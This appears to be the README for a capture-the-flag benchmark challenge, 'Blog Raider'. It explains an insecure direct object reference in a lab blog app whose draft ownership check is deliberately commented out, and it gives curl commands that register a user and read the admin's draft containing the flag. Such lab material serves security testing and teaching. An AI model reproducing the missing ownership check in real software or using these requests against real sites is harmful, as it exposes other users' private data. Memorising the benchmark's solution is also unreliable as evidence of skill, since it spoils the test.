# XBEN-090-24 — Blog Raider

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Insecure Direct Object Reference (IDOR) / broken authorization. `/<username>/drafts`
only checks `@login_required` (i.e. that *some* user is logged in) but never verifies that
`username` in the URL belongs to the requester — any authenticated user can view `/admin/drafts`
and see the admin's draft list, including the seeded `admin_draft` (id=1) whose content is the
flag. `/edit_draft/<draft_id>` has the same flaw — the ownership check
(`if draft.author != current_user`) is literally commented out in `app.py` — so any logged-in
user can fetch `/edit_draft/1` and read/edit the admin's draft content directly.

## Exploit

```bash
# Register a normal (non-admin) account
curl -s -c cookies.txt -X POST http://localhost:55430/register \
  -d "username=raider2&password=raiderpass&confirm_password=raiderpass"

# Log in as that account
curl -s -c cookies.txt -b cookies.txt -X POST http://localhost:55430/login \
  -d "username=raider2&password=raiderpass" -L -o /dev/null

# IDOR: view the admin's draft list directly (just by URL username)
curl -s -b cookies.txt http://localhost:55430/admin/drafts

# IDOR: view the admin's draft content directly by ID (ownership check is disabled)
curl -s -b cookies.txt http://localhost:55430/edit_draft/1
```
